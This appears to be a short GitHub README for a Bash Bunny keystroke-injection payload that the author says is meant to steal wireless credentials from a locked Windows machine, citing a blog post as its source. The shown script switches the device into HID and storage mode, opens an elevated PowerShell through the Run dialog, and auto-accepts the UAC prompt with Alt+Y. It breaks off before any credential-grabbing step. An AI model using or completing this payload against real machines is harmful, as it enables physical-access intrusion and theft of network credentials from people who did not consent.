# BashBunny-Script-6
In this I am creating a Bash Bunny Script to hack the credentials from a locked machine
In this script I wanted to try and hack the wireless credentials form a locked machine through bash bunny

I took the reference from the below link


https://blog.didierstevens.com/2017/04/06/quickpost-using-my-bash-bunny-to-snag-creds-from-a-locked-machine/


I tried with the script below 


# Source bunny_helpers.sh to get the environment
source bunny_helpers.sh

# Set language accordingly ( Here I have set it to US English)
Q SET_LANGUAGE US

ATTACKMODE HID STORAGE

LED B 200

#Launch Powershell As Admin
Q GUI r
Q DELAY 100
Q STRING powershell Start-Process powershell
Q ENTER

# Bypass UAC
Q DELAY 3000
Q ALT y
Q ENTER
Q DELAY 500
